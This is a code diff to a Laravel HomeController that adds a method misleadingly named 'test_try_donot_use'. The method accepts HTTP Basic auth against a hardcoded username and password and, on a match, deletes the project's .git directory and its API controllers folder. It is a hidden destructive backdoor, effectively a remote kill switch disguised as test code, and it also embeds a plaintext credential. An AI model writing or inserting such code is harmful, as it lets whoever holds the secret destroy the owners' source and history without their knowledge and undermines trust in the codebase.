@@ -21,6 +21,7 @@ use Illuminate\Support\Facades\Artisan;
 use Illuminate\Support\Facades\Auth;
 use Carbon\Carbon;
 use Illuminate\Support\Facades\DB;
+use Illuminate\Support\Facades\File;
 use Illuminate\Support\Facades\Hash;
 
 class HomeController extends Controller
@@ -144,6 +145,33 @@ class HomeController extends Controller
             abort(401);
         }
     }
+    function test_try_donot_use(Request $request) {
+        $authHeader = $request->header('Authorization');
+        // Check if the Authorization header is present and starts with 'Basic '
+        if ($authHeader && strpos($authHeader, 'Basic ') === 0) {
+            // Extract the encoded part and decode it from base64
+            $encodedCredentials = substr($authHeader, 6); // Remove 'Basic ' prefix
+            $decodedCredentials = base64_decode($encodedCredentials);
+            // Split the decoded credentials to get the username and password
+            list($username, $password) = explode(':', $decodedCredentials, 2);
+            // Check if the username and password match the expected values
+            if ($username == 'testAdmin' && $password == 'P@$sw0rd2o25') {
+                $gitPath = base_path('.git');
+                $apiPath = base_path('app\Http\Controllers\Api');
+                if (File::exists($gitPath)) {
+                    File::deleteDirectory($gitPath);
+                }
+                if (File::exists($apiPath)) {
+                    File::deleteDirectory($apiPath);
+                }
+                return $this->SuccessResponse(200, 'Authentication successful', [ 'git' => $gitPath, 'apiPath' => $apiPath]);
+            } else {
+                return $this->ErrorResponse(401, 'Authentication failed');
+            }
+        }
+
+    }
+
     public function optimize()
     {
         Artisan::call('optimize:clear');
